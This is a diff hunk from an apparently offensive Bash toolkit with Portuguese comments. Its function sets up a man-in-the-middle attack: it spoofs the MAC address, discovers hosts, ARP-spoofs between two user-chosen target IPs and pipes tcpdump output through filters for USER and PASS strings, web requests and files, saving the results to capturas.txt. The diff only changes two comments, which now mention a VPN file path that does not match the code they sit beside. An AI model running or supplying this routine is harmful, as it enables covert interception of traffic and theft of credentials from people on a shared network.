@@ -1428,13 +1428,13 @@
         function estrutura_mitm (){
             macchanger -r "$INTERFACE";  # Altera o endereço MAC da interface para fins de spoofing
             #wireshark -i "$INTERFACE" -k >/dev/null 2>&1 & # Inicia o Wireshark para captura de pacotes em segundo plano #TODO:REATIVAR WIRESHARK 
-            tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $REDE" & \  # Inicia o Netdiscover em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 628:  : command not found
+            tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $REDE" & \  # Inicia o Netdiscover em uma nova sessão do Tilix # #! I need to give the correct path to vpn file FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 628:  : command not found
             sleep 10  # Espera por 10 segundos
             echo -n "Digite o IP do ALV01: "  # Solicita o IP do alvo 1
             read -r ALV01  # Lê o IP do alvo 1
             echo -n "Digite o IP do ALV02: "  # Solicita o IP do alvo 2
             read -r ALV02  # Lê o IP do alvo 2
-            tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $ALV01 -r $ALV02" & \  # Inicia o Arpspoof em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 634:  : command not found
+            tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $ALV01 -r $ALV02" & \  # Inicia o Arpspoof em uma nova sessão do Tilix #! I need to give the correct path to vpn file FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 634:  : command not found
             #clear  # Limpa a tela
             #open a new konsole session with arpspoof
             tcpdump -i "$INTERFACE" -t host "$ALV01" and host "$ALV02" | grep -E '\[P.\]' | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' | tee capturas.txt #todo: add mais ext aos filtros com regex '  # Inicia o Tcpdump para captura de pacotes entre os alvos
